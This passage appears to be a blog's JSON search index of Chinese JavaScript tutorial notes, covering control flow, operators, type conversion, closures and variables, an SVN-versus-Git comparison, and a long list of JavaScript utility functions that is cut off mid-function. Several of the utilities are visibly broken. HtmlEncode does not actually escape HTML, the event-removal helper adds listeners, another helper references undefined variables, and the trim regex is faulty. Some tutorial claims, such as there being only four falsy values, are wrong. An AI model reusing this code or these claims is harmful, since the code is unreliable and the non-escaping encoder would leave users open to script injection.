当通过判断执行N段逻辑代码的时候，只能用条件结构 switch switch case break default 条件 判断 退出 默认 a.只要匹配上一个case，那么它下面的所有的case都会执行包括default b.break的意思跳出当前结构 for 循环有三个要素 a.循环变量 b.判断（循环体） c.改变循环变量 d.continue的意思结束本次循环进入下次循环 continue 结束本次循环，继续下一次循环 当前这次循环不做 直接做下面的 break 结束后面的循环不做了 while/do...while没有谁好谁坏 只有适应场景不同 比如：先吃饭 在买单 do..while 用户体验高 有风险 扫雷游戏也是先体验 在问是否退出 提高体验 比如：先买单 在吃饭 while 用户体验不高 一般情况下面，如果条件判断是数字的比较==&lt;&gt;，for循环优先. 如果是非数值相关的比较循环，while优先 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之字符串方法(四)","slug":"2016-07-JavaScript语言基础之字符串方法-四","date":"2016-07-26T15:46:43.000Z","updated":"2018-10-24T03:46:01.778Z","comments":true,"path":"note/6a756edd.html","link":"","permalink":"https://ru23.com/note/6a756edd.html","excerpt":"","text":"附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之运算符(三)","slug":"2016-07-JavaScript语言基础之运算符-三","date":"2016-07-26T14:46:43.000Z","updated":"2018-10-24T03:46:01.787Z","comments":true,"path":"note/477e687b.html","link":"","permalink":"https://ru23.com/note/477e687b.html","excerpt":"算术运算符(+,-,*,/,%,++,--`) 如果引用所指的地方是null的话，那么在运算中就会自动变成0 %运算符 如：4%5取模 模是4 7%5取模 模是7-5=2","text":"算术运算符(+,-,*,/,%,++,--`) 如果引用所指的地方是null的话，那么在运算中就会自动变成0 %运算符 如：4%5取模 模是4 7%5取模 模是7-5=2 字符串和数字相加的情况： 左右都是数字：数字相加 左右有一个字符串：字符串拼接 左右边有一个null:null看做0 左右边有一个undefined：结果是NAN（not is number） 赋值运算符(=,-=,+=,*=,/=,%=`) 比较运算符(==,===,!=,&gt;,&lt;,&gt;=,&lt;=`) 先执行表达式计算再赋值 ==和!=在比较之前首先让双方的值做隐士类型转换，===不转换 逻辑运算符(||,&amp;&amp;,!) || 在js中和PHP中是不一样的 js中返回逻辑或的左边或右边的一个结果 PHP返回||或出来以后的结果即：true false 特殊性（注意）—一定要记住（这个特性和其他编程语言不一样）：在js里返回不是布尔值 || 短路运算 第一个条件为真 后面不执行 ‘&amp;&amp;’把表达式最后一个值返回（注意这里） 例子：var age = prompt(“温馨提示：”,”请输入您的年龄”)||0 当点击取消的时候，如果出现undefined null fasle 0 表示非的逻辑 那么||就会过滤，取右边的值0 条件运算符(表达式1?表达式2:表达式3)三元运算符 表达式1?表达式2:表达式3 表达式1为真 返回表达式2 否则返回表达式3 三元运算符 可以多层次嵌套使用 在js中 有四种被认为是非： undefined null false 0 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之数据类型(二)","slug":"2016-07-JavaScript语言基础之数据类型-二","date":"2016-07-26T13:46:43.000Z","updated":"2018-10-24T03:46:01.780Z","comments":true,"path":"note/fd8d9d1f.html","link":"","permalink":"https://ru23.com/note/fd8d9d1f.html","excerpt":"一、JavaScript中基本的数据类型查看数据类型用：typeof 变量名","text":"一、JavaScript中基本的数据类型查看数据类型用：typeof 变量名Javascript的数据类型有六种（ES6新增了第七种Symbol） JS中的值有两种类型：原始类型(Primitive)、对象类型(Object)。 原始类型包括：Undefined、Null、Boolean、Number和String等五种。 Undefined类型和Null类型的都只有一个值，即undefined和null；Boolean类型有两个值：true和false；Number类型的值有很多很多；String类型的值理论上有无数个。 所有对象都有valueOf()和toString()方法，它们继承自Object，当然也可能被子类重写 数值（number）：整数和小数（比如1和3.14） 字符串（string）：字符组成的文本（比如”Hello World”） 布尔值（boolean）：true（真）和false（假）两个特定值 undefined：表示 未定义 或不存在，即此处目前没有任何值 null：表示空缺，即此处应该有一个值，但目前为空 对象（object）：各种值组成的集合 通常，我们将数值、字符串、布尔值称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。而将对象称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于undefined和null，一般将它们看成两个特殊值 二、数据类型的转换 转换函数 toString() 转换为字符串，在JavaScript中所有数据类型都可以转换为string类型 12345678910var n1 = 12;var n2 = true;var a = [1, 2, 3];var o = &#123;&#125;;function f()&#123;&#125;n1.toString(); //\"12\"n2.toString(); //\"true\"a.toString(); //\"1,2,3\"o.toString(); //\"[object Object]\"f.toString(); //\"function f()&#123;&#125;\" parseInt()解析出一个string或者number类型的整数部分，如果没有可以转换的部分，则返回NaN（not a number） 123456var n1 = \"12\";var n2 = \"23hello\";var n3 = \"hello\";parseInt(n1); //12parseInt(n2); //23parseInt(n3); //NaN parseFloat()解析出一个string的浮点数部分，如果没有可以转换的部分，则返回NaN（not a number） 123456var n1 = \"1.2.3\";var n2 = \"1.2hello\"var n3 = \"hello\"parseFloat(n1); //1.2parseFloat(n2); //1.2parseFloat(n3); //NaN 强制类型转换 Boolean(value)- 把给定的值转换成Boolean型 123456Boolean(123); //trueBoolean(\"\"); //falseBoolean([]); //trueBoolean(&#123;&#125;); //trueBoolean(null); //falseBoolean(undefined); //false Number(value)-把给定的值转换成数字（可以是整数或浮点数） 12345678Number(\"123\"); //123Number(\"123h\"); //NaNNumber(true); //1Number(false); //0Number(undefined); //NaNNumber(null); //0Number([]); //0Number(&#123;&#125;); //NaN String(value)- 把给定的值转换成字符串 12345String(123); //\"123\"String([1,2]); //\"1,2\"String(undefined) //\"undefined\"String(null) //\"null\"String(&#123;&#125;) //\"[object Object]\" 隐式转换 数字＋字符串：数字转换为字符串 console.log(12+&quot;12&quot;); //1212 数字＋布尔值：true转换为1，false转换为0 console.log(12+true); //13 字符串＋布尔值：布尔值转换为true或false console.log(&quot;hello&quot;+true); //hellotrue 布尔值＋布尔值 console.log(true+true); //2 null和undefined undefined 表示一种未知状态，声明了但没有初始化的变量，变量的值时一个未知状态。访问不存在的属性或对象window.xxx）方法没有明确返回值时，返回值是一个undefined.当对未声明的变量应用typeof运算符时，显示为undefined。 null表示尚未存在的对象,null是一个有特殊意义的值。可以为变量赋值为null，此时变量的值为“已知状态”(不是undefined)，即null。（用来初始化变量，清除变量内容，释放内存） `undefined==null` //结果为true,但含义不同。 `undefined===null` //false,两者类型不一致，前者为“undefined”，后者为“object” 总结一下==运算的规则：(隐式转换) undefined == null，结果是true。且它俩与所有其他值比较的结果都是false。 String == Boolean，需要两个操作数同时转为Number。 String/Boolean == Number，需要String/Boolean转为Number。 Object == Primitive，需要Object转为Primitive(具体通过valueOf和toString方法) 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之函数基础(六)","slug":"2016-07-JavaScript语言基础之函数基础-六","date":"2016-07-26T13:46:43.000Z","updated":"2018-10-24T03:46:01.773Z","comments":true,"path":"note/4bed88f0.html","link":"","permalink":"https://ru23.com/note/4bed88f0.html","excerpt":"代码内存解析","text":"代码内存解析 闭包 a.程序永远是先定义后执行 b.执行永远从上到下 c.函数定义的话在堆（只是一个地址而已） d.函数调用的时候，就会有自己的堆和栈（闭包） 闭包 作用域 记住：先定义var function 在从上往下执行 定义定义在自己的栈里面 执行在自己的堆里面 运行在运行的环境中 函数每调用前 只是一个地址 只要调用一次函数就会动态开辟一块内存 创建一个封闭的空间 在自己的封闭的空间的栈中定义var在执行 函数执行完 里面的东西全部销毁 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript语言基础之变量(一)","slug":"2016-07-JavaScript语言基础之变量-一","date":"2016-07-26T12:46:43.000Z","updated":"2018-10-24T03:46:01.775Z","comments":true,"path":"note/e67d370b.html","link":"","permalink":"https://ru23.com/note/e67d370b.html","excerpt":"关于变量的一些讨论 变量是内存中的一段存储空间，变量的值就是一段地址 存储的是值（变量名本质是地址的一个别名） 变量本质是一个空盒子，里面记录了一个内存地址，使能找到内存中的对象，保存了指向具体的实在的东西的地址 在js语言中 不必像php那样神明引用赋值， 不用加&amp;取地址 在js中三种默认是引用赋值的：数组 对象 函数 变量存在栈中，对象存在堆中 变量的意义：方便我们去操作对象 var b = document.body 含义：把body这个对象在内存中的地址放到b变量里面，变量b（b是内存地址的别名）本身也存在内存中，以后的操作是针对body这个地址","text":"关于变量的一些讨论 变量是内存中的一段存储空间，变量的值就是一段地址 存储的是值（变量名本质是地址的一个别名） 变量本质是一个空盒子，里面记录了一个内存地址，使能找到内存中的对象，保存了指向具体的实在的东西的地址 在js语言中 不必像php那样神明引用赋值， 不用加&amp;取地址 在js中三种默认是引用赋值的：数组 对象 函数 变量存在栈中，对象存在堆中 变量的意义：方便我们去操作对象 var b = document.body 含义：把body这个对象在内存中的地址放到b变量里面，变量b（b是内存地址的别名）本身也存在内存中，以后的操作是针对body这个地址 变量命名规范 由字母(a-zA-Z)数字(0-9)下划线(_)以及美元符号($) 不能由数字开头 命名尽量用英文并且具有一定的含义 如果有多个英文单词,后面单词的首字母大写 不能使用关键字 首字母不要大写，大写是有特殊含义的 附录：思维导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"Svn与Git的区别","slug":"2016-07-Svn与Git的区别","date":"2016-07-22T13:15:20.000Z","updated":"2018-10-24T03:46:01.795Z","comments":true,"path":"note/55ec2a12.html","link":"","permalink":"https://ru23.com/note/55ec2a12.html","excerpt":"最核心的区别Git是分布式的，而Svn不是分布的。能理解这点，上手会很容易，声明一点Git并不是目前唯一的分布式版本控制系统，还有比如Mercurial等，所以说它们差不许多。话说回来Git跟Svn一样有自己的集中式版本库和Server端，但Git更倾向于分布式开发，因为每一个开发人员的电脑上都有一个Local Repository,所以即使没有网络也一样可以Commit，查看历史版本记录，创建项 目分支等操作，等网络再次连接上Push到Server端。","text":"最核心的区别Git是分布式的，而Svn不是分布的。能理解这点，上手会很容易，声明一点Git并不是目前唯一的分布式版本控制系统，还有比如Mercurial等，所以说它们差不许多。话说回来Git跟Svn一样有自己的集中式版本库和Server端，但Git更倾向于分布式开发，因为每一个开发人员的电脑上都有一个Local Repository,所以即使没有网络也一样可以Commit，查看历史版本记录，创建项 目分支等操作，等网络再次连接上Push到Server端。 从上面看GIt真的很棒，但是GIt adds Complexity,刚开始使用会有些疑惑，因为需要建两个Repositories(Local Repositories &amp; Remote Repositories),指令很多，除此之外你需要知道哪些指令在Local Repository，哪些指令在Remote Repository。 Git把内容按元数据方式存储，而SVN是按文件：因为,.git目录是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。.git目录的体积大小跟.svn比较，你会发现它们差距很大。 Git没有一个全局版本号，而SVN有：目前为止这是跟SVN相比Git缺少的最大的一个特征。 Git的内容的完整性要优于SVN: GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 Git下载下来后，在OffLine状态下可以看到所有的Log,SVN不可以。 刚开始用时很狗血的一点，SVN必须先Update才能Commit,忘记了合并时就会出现一些错误，git还是比较少的出现这种情况。 克隆一份全新的目录以同样拥有五个分支来说，SVN是同时复製5个版本的文件,也就是说重复五次同样的动作。而Git只是获取文件的每个版本的 元素，然后只载入主要的分支(master)在我的经验,克隆一个拥有将近一万个提交(commit),五个分支,每个分支有大约1500个文件的 SVN,耗了将近一个小时！而Git只用了区区的1分钟！ 版本库（repository):SVN只能有一个指定中央版本库。当这个中央版本库有问题时，所有工作成员都一起瘫痪直到版本库维修完毕或者新的版本库设立完成。而 Git可以有无限个版本库。或者，更正确的说法，每一个Git都是一个版本库，区别是它们是否拥有活跃目录（Git Working Tree）。如果主要版本库（例如：置於GitHub的版本库）发生了什麼事，工作成员仍然可以在自己的本地版本库（local repository）提交，等待主要版本库恢复即可。工作成员也可以提交到其他的版本库！ 分支（Branch）在SVN，分支是一个完整的目录。且这个目录拥有完整的实际文件。如果工作成员想要开啟新的分支，那将会影响“全世界”！每个人都会拥有和你一样的分支。如果你的分支是用来进行破坏工作（安检测试），那将会像传染病一样,你改一个分支，还得让其他人重新切分支重新下载，十分狗血。而 Git，每个工作成员可以任意在自己的本地版本库开啟无限个分支。举例：当我想尝试破坏自己的程序（安检测试），并且想保留这些被修改的文件供日后使用， 我可以开一个分支，做我喜欢的事。完全不需担心妨碍其他工作成员。只要我不合并及提交到主要版本库，没有一个工作成员会被影响。等到我不需要这个分支时， 我只要把它从我的本地版本库删除即可。无痛无痒。 Git的分支名是可以使用不同名字的。例如：我的本地分支名为OK，而在主要版本库的名字其实是master。 最值得一提，我可以在Git的任意一个提交点（commit point）开启分支！（其中一个方法是使用gitk –all 可观察整个提交记录，然后在任意点开啟分支。） 提交（Commit）在SVN，当你提交你的完成品时，它将直接记录到中央版本库。当你发现你的完成品存在严重问题时，你已经无法阻止事情的发生了。如果网路中断，你根本没办法提交！而Git的提交完全属於本地版本库的活动。而你只需“推”（git push）到主要版本库即可。Git的“推”其实是在执行“同步”（Sync）。 总结： SVN的特点是简单，只是需要一个放代码的地方时用是OK的。 Git的特点版本控制可以不依赖网络做任何事情，对分支和合并有更好的支持(当然这是开发者最关心的地方)","categories":[{"name":"VCS","slug":"VCS","permalink":"https://ru23.com/categories/VCS/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://ru23.com/tags/GitHub/"},{"name":"SVN","slug":"SVN","permalink":"https://ru23.com/tags/SVN/"}]},{"title":"Javascript常用方法函数收集","slug":"2016-07-Javascript常用方法函数收集","date":"2016-07-19T15:25:20.000Z","updated":"2018-10-24T03:46:01.730Z","comments":true,"path":"note/30fd5d95.html","link":"","permalink":"https://ru23.com/note/30fd5d95.html","excerpt":"字符串长度截取","text":"字符串长度截取 1234567891011121314151617181920function cutstr(str, len) &#123;var temp, icount = 0, patrn = /[^\\x00-\\xff]/， strre = \"\";for (var i = 0; i &lt; str.length; i++) &#123; if (icount &lt; len - 1) &#123; temp = str.substr(i, 1); if (patrn.exec(temp) == null) &#123; icount = icount + 1 &#125; else &#123; icount = icount + 2 &#125; strre += temp &#125; else &#123; break; &#125;&#125;return strre + \"...\"&#125; 替换全部123String.prototype.replaceAll = function(s1, s2) &#123; return this.replace(new RegExp(s1, \"gm\"), s2)&#125; 清除空格*1234String.prototype.trim = function() &#123; var reExtraSpace = /^\\s*(.*?)\\s+$/; return this.replace(reExtraSpace, \"$1\")&#125; 清除左空格/右空格*12function ltrim(s)&#123; return s.replace( /^(\\s*| *)/, \"\"); &#125; function rtrim(s)&#123; return s.replace( /(\\s*| *)$/, \"\"); &#125; 判断是否以某个字符串开头*123String.prototype.startWith = function (s) &#123; return this.indexOf(s) == 0&#125; 判断是否以某个字符串结束*1234String.prototype.endWith = function (s) &#123; var d = this.length - s.length; return (d &gt;= 0 &amp;&amp; this.lastIndexOf(s) == d)&#125; 转义html标签*123function HtmlEncode(text) &#123; return text.replace(/&amp;/g, '&amp;').replace(/\\\"/g, '\"').replace(/&lt;/g, '&lt;').replace(/&gt;/g, '&gt;')&#125; 时间日期格式转换*123456789101112131415161718Date.prototype.Format = function(formatStr) &#123; var str = formatStr; var Week = ['日', '一', '二', '三', '四', '五', '六']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/yy|YY/, (this.getYear() % 100) &gt; 9 ? (this.getYear() % 100).toString() : '0' + (this.getYear() % 100)); str = str.replace(/MM/, (this.getMonth() + 1) &gt; 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/M/g, (this.getMonth() + 1)); str = str.replace(/w|W/g, Week[this.getDay()]); str = str.replace(/dd|DD/, this.getDate() &gt; 9 ? this.getDate().toString() : '0' + this.getDate()); str = str.replace(/d|D/g, this.getDate()); str = str.replace(/hh|HH/, this.getHours() &gt; 9 ? this.getHours().toString() : '0' + this.getHours()); str = str.replace(/h|H/g, this.getHours()); str = str.replace(/mm/, this.getMinutes() &gt; 9 ? this.getMinutes().toString() : '0' + this.getMinutes()); str = str.replace(/m/g, this.getMinutes()); str = str.replace(/ss|SS/, this.getSeconds() &gt; 9 ? this.getSeconds().toString() : '0' + this.getSeconds()); str = str.replace(/s|S/g, this.getSeconds()); return str&#125; 判断是否为数字类型*12345678function isDigit(value) &#123; var patrn = /^[0-9]*$/; if (patrn.exec(value) == null || value == \"\") &#123; return false &#125; else &#123; return true &#125;&#125; 设置cookie值*123456789function setCookie(name, value, Hours) &#123; var d = new Date(); var offset = 8; var utc = d.getTime() + (d.getTimezoneOffset() * 60000); var nd = utc + (3600000 * offset); var exp = new Date(nd); exp.setTime(exp.getTime() + Hours * 60 * 60 * 1000); document.cookie = name + \"=\" + escape(value) + \";path=/;expires=\" + exp.toGMTString() + \";domain=360doc.com;\"&#125; 获取cookie值*12345function getCookie(name) &#123; var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return unescape(arr[2]); return null&#125; 加入收藏夹*1234567891011function AddFavorite(sURL, sTitle) &#123; try &#123; window.external.addFavorite(sURL, sTitle) &#125; catch(e) &#123; try &#123; window.sidebar.addPanel(sTitle, sURL, \"\") &#125; catch(e) &#123; alert(\"加入收藏失败，请使用Ctrl+D进行添加\") &#125; &#125;&#125; 设为首页*12345678910111213141516function setHomepage() &#123; if (document.all) &#123; document.body.style.behavior = 'url(#default#homepage)'; document.body.setHomePage('http://w3cboy.com') &#125; else if (window.sidebar) &#123; if (window.netscape) &#123; try &#123; netscape.security.PrivilegeManager.enablePrivilege(\"UniversalXPConnect\") &#125; catch(e) &#123; alert(\"该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项 signed.applets.codebase_principal_support 值该为true\") &#125; &#125; var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch); prefs.setCharPref('browser.startup.homepage', 'http://w3cboy.com') &#125;&#125; 加载样式文件*123456789101112function LoadStyle(url) &#123; try &#123; document.createStyleSheet(url) &#125; catch(e) &#123; var cssLink = document.createElement('link'); cssLink.rel = 'stylesheet'; cssLink.type = 'text/css'; cssLink.href = url; var head = document.getElementsByTagName('head')[0]; head.appendChild(cssLink) &#125;&#125; 返回脚本内容123456789101112131415161718function evalscript(s) &#123; if(s.indexOf('&lt;script') == -1) return s; var p = /&lt;script[^\\&gt;]*?&gt;([^\\x00]*?)&lt;\\/script&gt;/ig; var arr = []; while(arr = p.exec(s)) &#123; var p1 = /&lt;script[^\\&gt;]*?src=\\\"([^\\&gt;]*?)\\\"[^\\&gt;]*?(reload=\\\"1\\\")?(?:charset=\\\"([\\w\\-]+?)\\\")?&gt;&lt;\\/script&gt;/i; var arr1 = []; arr1 = p1.exec(arr[0]); if(arr1) &#123; appendscript(arr1[1], '', arr1[2], arr1[3]); &#125; else &#123; p1 = /&lt;script(.*?)&gt;([^\\x00]+?)&lt;\\/script&gt;/i; arr1 = p1.exec(arr[0]); appendscript('', arr1[2], arr1[1].indexOf('reload=') != -1); &#125; &#125; return s;&#125; 清除脚本内容123function stripscript(s) &#123; return s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/ig, '');&#125; 动态加载脚本文件1234567891011121314151617181920212223242526272829303132function appendscript(src, text, reload, charset) &#123; var id = hash(src + text); if(!reload &amp;&amp; in_array(id, evalscripts)) return; if(reload &amp;&amp; $(id)) &#123; $(id).parentNode.removeChild($(id)); &#125; evalscripts.push(id); var scriptNode = document.createElement(\"script\"); scriptNode.type = \"text/javascript\"; scriptNode.id = id; scriptNode.charset = charset ? charset : (BROWSER.firefox ? document.characterSet : document.charset); try &#123; if(src) &#123; scriptNode.src = src; scriptNode.onloadDone = false; scriptNode.onload = function () &#123; scriptNode.onloadDone = true; JSLOADED[src] = 1; &#125;; scriptNode.onreadystatechange = function () &#123; if((scriptNode.readyState == 'loaded' || scriptNode.readyState == 'complete') &amp;&amp; !scriptNode.onloadDone) &#123; scriptNode.onloadDone = true; JSLOADED[src] = 1; &#125; &#125;; &#125; else if(text)&#123; scriptNode.text = text; &#125; document.getElementsByTagName('head')[0].appendChild(scriptNode); &#125; catch(e) &#123;&#125;&#125; 返回按ID检索的元素对象123function $(id) &#123; return !id ? null : document.getElementById(id);&#125; 跨浏览器绑定事件12345678910function addEventSamp(obj,evt,fn)&#123; if(!oTarget)&#123;return;&#125; if (obj.addEventListener) &#123; obj.addEventListener(evt, fn, false); &#125;else if(obj.attachEvent)&#123; obj.attachEvent('on'+evt,fn); &#125;else&#123; oTarget[\"on\" + sEvtType] = fn; &#125; &#125; 跨浏览器删除事件12345678910function delEvt(obj,evt,fn)&#123; if(!obj)&#123;return;&#125; if(obj.addEventListener)&#123; obj.addEventListener(evt,fn,false); &#125;else if(oTarget.attachEvent)&#123; obj.attachEvent(\"on\" + evt,fn); &#125;else&#123; obj[\"on\" + evt] = fn; &#125;&#125; 为元素添加on方法12345678Element.prototype.on = Element.prototype.addEventListener; NodeList.prototype.on = function (event, fn) &#123;、 []['forEach'].call(this, function (el) &#123; el.on(event, fn); &#125;); return this;&#125;; 为元素添加trigger方法12345678910111213141516Element.prototype.trigger = function (type, data) &#123; var event = document.createEvent('HTMLEvents'); event.initEvent(type, true, true); event.data = data || &#123;&#125;; event.eventName = type; event.target = this; this.dispatchEvent(event); return this;&#125;; NodeList.prototype.trigger = function (event) &#123; []['forEach'].call(this, function (el) &#123; el['trigger'](event); &#125;); return this;&#125;; 检验URL链接是否有效12345678910111213141516171819function getUrlState(URL)&#123; var xmlhttp = new ActiveXObject(\"microsoft.xmlhttp\"); xmlhttp.Open(\"GET\",URL, false); try&#123; xmlhttp.Send(); &#125;catch(e)&#123; &#125;finally&#123; var result = xmlhttp.responseText; if(result)&#123; if(xmlhttp.Status==200)&#123; return(true); &#125;else&#123; return(false); &#125; &#125;else&#123; return(false); &#125; &#125;&#125; 格式化CSS样式代码123456789function formatCss(s)&#123;//格式化代码 s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, \"$1\"); s = s.replace(/;\\s*;/g, \";\"); //清除连续分号 s = s.replace(/\\,[\\s\\.\\#\\d]*&#123;/g, \"&#123;\"); s = s.replace(/([^\\s])\\&#123;([^\\s])/g, \"$1 &#123;\\n\\t$2\"); s = s.replace(/([^\\s])\\&#125;([^\\n]*)/g, \"$1\\n&#125;\\n$2\"); s = s.replace(/([^\\s]);([^\\s\\&#125;])/g, \"$1;\\n\\t$2\"); return s;&#125; 压缩CSS样式代码12345678function compressCss (s) &#123;//压缩代码 s = s.replace(/\\/\\*(.|\\n)*?\\*\\//g, \"\"); //删除注释 s = s.replace(/\\s*([\\&#123;\\&#125;\\:\\;\\,])\\s*/g, \"$1\"); s = s.replace(/\\,[\\s\\.\\#\\d]*\\&#123;/g, \"&#123;\"); //容错处理 s = s.replace(/;\\s*;/g, \";\"); //清除连续分号 s = s.match(/^\\s*(\\S+(\\s+\\S+)*)\\s*$/); //去掉首尾空白 return (s == null) ? \"\" : s[1];&#125; 获取当前路径123456var currentPageUrl = \"\";if (typeof this.href === \"undefined\") &#123; currentPageUrl = document.location.toString().toLowerCase();&#125;else &#123; currentPageUrl = this.href.toString().toLowerCase();&#125; 判断是否移动设备1234567891011121314151617function isMobile()&#123; if (typeof this._isMobile === 'boolean')&#123; return this._isMobile; &#125; var screenWidth = this.getScreenWidth(); var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport ||rendererModel.runningExperiments.fixviewport; var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === \"new\"); if(!fixViewPortsExperiment)&#123; if(!this.isAppleMobileDevice())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; &#125; var isMobileScreenSize = screenWidth &lt; 600; var isMobileUserAgent = false; this._isMobile = isMobileScreenSize &amp;&amp; this.isTouchScreen(); return this._isMobile;&#125; 判断是否移动设备访问123function isMobileUserAgent()&#123; return (/iphone|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i.test(window.navigator.userAgent.toLowerCase()));&#125; 判断是否苹果移动设备访问123function isAppleMobileDevice()&#123; return (/iphone|ipod|ipad|Macintosh/i.test(navigator.userAgent.toLowerCase()));&#125; 判断是否安卓移动设备访问123function isAndroidMobileDevice()&#123; return (/android/i.test(navigator.userAgent.toLowerCase()));&#125; 判断是否Touch屏幕123function isTouchScreen()&#123; return (('ontouchstart' in window) || window.DocumentTouch &amp;&amp; document instanceof DocumentTouch);&#125; 判断是否打开视窗123function isViewportOpen() &#123; return !!document.getElementById('wixMobileViewport');&#125; 获取移动设备初始化大小12345678910function getInitZoom()&#123; if(!this._initZoom)&#123; var screenWidth = Math.min(screen.height, screen.width); if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; this._initZoom = screenWidth /document.body.offsetWidth; &#125; return this._initZoom;&#125; 取移动设备最大化大小12345678910111213function getZoom()&#123; var screenWidth = (Math.abs(window.orientation) === 90) ? Math.max(screen.height, screen.width) : Math.min(screen.height, screen.width); if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; screenWidth = screenWidth/window.devicePixelRatio; &#125; var FixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport; var FixViewPortsExperimentRunning = FixViewPortsExperiment &amp;&amp; (FixViewPortsExperiment === \"New\" || FixViewPortsExperiment === \"new\"); if(FixViewPortsExperimentRunning)&#123; return screenWidth / window.innerWidth; &#125;else&#123; return screenWidth / document.body.offsetWidth; &#125;&#125; 取移动设备屏幕宽度1234567891011function getScreenWidth()&#123; var smallerSide = Math.min(screen.width, screen.height); var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport; var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === \"new\"); if(fixViewPortsExperiment)&#123; if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; smallerSide = smallerSide/window.devicePixelRatio; &#125; &#125; return smallerSide;&#125; 美判断是否为网址12345678function IsURL(strUrl) &#123; var regular = /^\\b(((https?|ftp):\\/\\/)?[-a-z0-9]+(\\.[-a-z0-9]+)*\\.(?:com|edu|gov|int|mil|net|org|biz|info|name|museum|asia|coop|aero|[a-z][a-z]|((25[0-5])|(2[0-4]\\d)|(1\\d\\d)|([1-9]\\d)|\\d))\\b(\\/[-a-z0-9_:\\@&amp;?=+,.!\\/~%\\$]*)?)$/i if (regular.test(strUrl)) &#123; return true; &#125;else &#123; return false; &#125;&#125; etElementsByClassName12345678910111213141516function getElementsByClassName(name) &#123; var tags = document.getElementsByTagName('*') || document.all; var els = []; for (var i = 0; i &lt; tags.length; i++) &#123; if (tags.className) &#123; var cs = tags.className.split(' '); for (var j = 0; j &lt; cs.length; j++) &#123; if (name == cs[j]) &#123; els.push(tags); break &#125; &#125; &#125; &#125; return els&#125; 取页面高度123456function getPageHeight()&#123; var g = document, a = g.body, f = g.documentElement, d = g.compatMode == \"BackCompat\" ? a : g.documentElement; return Math.max(f.scrollHeight, a.scrollHeight, d.clientHeight);&#125; 取页面scrollLeft1234function getPageScrollLeft()&#123; var a = document; return a.documentElement.scrollLeft || a.body.scrollLeft;&#125; 取页面可视宽度123456function getPageViewWidth()&#123; var d = document, a = d.compatMode == \"BackCompat\" ? d.body : d.documentElement; return a.clientWidth;&#125; 取页面宽度123456function getPageWidth()&#123; var g = document, a = g.body, f = g.documentElement, d = g.compatMode == \"BackCompat\" ? a : g.documentElement; return Math.max(f.scrollWidth, a.scrollWidth, d.clientWidth);&#125; 取页面scrollTop1234function getPageScrollTop()&#123; var a = document; return a.documentElement.scrollTop || a.body.scrollTop;&#125; 取页面可视高度123456function getPageViewHeight() &#123; var d = document, a = d.compatMode == \"BackCompat\" ? d.body : d.documentElement; return a.clientHeight;&#125; 掉url前缀1234567function removeUrlPrefix(a)&#123; a=a.replace(/：/g,\":\").replace(/．/g,\".\").replace(/／/g,\"/\"); while(trim(a).toLowerCase().indexOf(\"http://\")==0)&#123; a=trim(a.replace(/http:\\/\\//i,\"\")); &#125; return a;&#125; 随机数时间戳1234function uniqueId()&#123; var a=Math.random,b=parseInt; return Number(new Date()).toString()+b(10*a())+b(10*a())+b(10*a());&#125; 全角半角转换1234567891011121314151617181920212223242526272829//iCase: 0全到半，1半到全，其他不转化function chgCase(sStr,iCase)&#123; if(typeof sStr != \"string\" || sStr.length &lt;= 0 || !(iCase === 0 || iCase == 1))&#123; return sStr; &#125; var i,oRs=[],iCode; if(iCase)&#123;/*半-&gt;全*/ for(i=0; i&lt;sStr.length;i+=1)&#123; iCode = sStr.charCodeAt(i); if(iCode == 32)&#123; iCode = 12288; &#125;else if(iCode &lt; 127)&#123; iCode += 65248; &#125; 